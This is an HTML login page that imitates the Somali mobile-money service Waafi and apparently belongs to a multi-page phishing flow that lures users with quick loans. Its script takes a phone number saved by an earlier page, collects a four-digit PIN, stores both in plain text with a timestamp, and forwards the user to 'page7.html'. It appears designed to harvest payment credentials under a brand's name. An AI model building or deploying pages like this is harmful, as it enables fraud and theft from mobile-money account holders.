<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gal</title>

<style>

body{
  margin:0;
  font-family:Arial;
  background:#7ac943;
  animation:fadeIn .6s ease;
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}

/* HEADER */
.header{
  text-align:center;
  color:white;
  padding:25px;
  font-weight:bold;
}

/* CARD */
.card{
  background:#f3f3f3;
  border-radius:35px 35px 0 0;
  padding:25px;
  min-height:80vh;
  text-align:center;
}

h2{color:#555;}

/* NUMBER BOX */
.numberBox{
  border:3px solid #7ac943;
  border-radius:12px;
  padding:15px;
  font-size:20px;
  margin:20px 0;
  background:white;
  display:flex;
  justify-content:center;
  gap:10px;
}

/* PIN */
.pinContainer{
  display:flex;
  justify-content:center;
  gap:15px;
  margin:20px 0;
}

.pin{
  width:55px;
  height:55px;
  border:3px solid #7ac943;
  border-radius:10px;
  font-size:26px;
  text-align:center;
  transition:.2s;
}

.pin:focus{
  transform:scale(1.15);
  outline:none;
}

/* SHAKE ANIMATION */
@keyframes shake{
  0%{transform:translateX(0);}
  25%{transform:translateX(-6px);}
  50%{transform:translateX(6px);}
  75%{transform:translateX(-6px);}
  100%{transform:translateX(0);}
}

.shake{
  animation:shake .3s;
}

/* BUTTON */
.btn{
  margin-top:25px;
  width:100%;
  padding:16px;
  border:none;
  border-radius:12px;
  font-size:18px;
  background:#ccc;
  color:white;
  transition:.3s;
}

.btn.active{
  background:#7ac943;
  transform:scale(1.03);
}

.btn:active{
  transform:scale(.97);
}

/* FOOTER */
.footer{
  text-align:center;
  color:white;
}

</style>
</head>

<body>

<div class="header">
Waafi<br>
Amaahado Sahlan oo Degdeg ah
</div>

<div class="card">

<h2>Gal</h2>

<div class="numberBox">
🇸🇴 <span id="phoneNumber">+252</span>
</div>

<p>Geli PIN-kaaga</p>

<div class="pinContainer" id="pinBox">
<input class="pin" maxlength="1" type="password">
<input class="pin" maxlength="1" type="password">
<input class="pin" maxlength="1" type="password">
<input class="pin" maxlength="1" type="password">
</div>

<p style="color:#777;">PIN-ka ma iloobtay?</p>

<button id="loginBtn" class="btn">GAL</button>

</div>

<div class="footer">
<h2>Waafi</h2>
<p>Amaahado Sahlan oo Degdeg ah</p>
</div>

<script>

/* ===============================
   LOAD NUMBER FROM PREVIOUS PAGE
================================= */

const savedNumber = localStorage.getItem("phoneNumber");

if(savedNumber){
  document.getElementById("phoneNumber").innerText =
      "+252 " + savedNumber;
}

/* ===============================
   PIN INPUT LOGIC
================================= */

const pins = document.querySelectorAll(".pin");
const button = document.getElementById("loginBtn");
const pinBox = document.getElementById("pinBox");

pins.forEach((input,index)=>{

  input.addEventListener("input",()=>{

    if(input.value.length === 1 && index < pins.length-1){
        pins[index+1].focus();
    }

    checkPin();
  });

  input.addEventListener("keydown",(e)=>{
    if(e.key==="Backspace" && input.value==="" && index>0){
        pins[index-1].focus();
    }
  });

});

/* ENABLE BUTTON */
function checkPin(){

  let complete=true;

  pins.forEach(p=>{
    if(p.value==="") complete=false;
  });

  if(complete){
    button.classList.add("active");
  }else{
    button.classList.remove("active");
  }
}

/* ===============================
   BUTTON CLICK
================================= */

button.onclick=function(){

  if(!button.classList.contains("active")){
      pinBox.classList.add("shake");
      setTimeout(()=>pinBox.classList.remove("shake"),300);
      return;
  }

  /* COLLECT PIN */
  let pin="";
  pins.forEach(p=> pin+=p.value);

  /* SAVE DATA */
  localStorage.setItem("userPIN", pin);

  const fullData={
    phone:savedNumber,
    pin:pin,
    time:new Date().toLocaleString()
  };

  localStorage.setItem("waafiData", JSON.stringify(fullData));

  /* SUCCESS ANIMATION */
  button.innerText="Processing...";
  button.style.background="#5fb82e";

  setTimeout(()=>{
      window.location.href="page7.html";
  },1500);
};

</script>

</body>
</html>
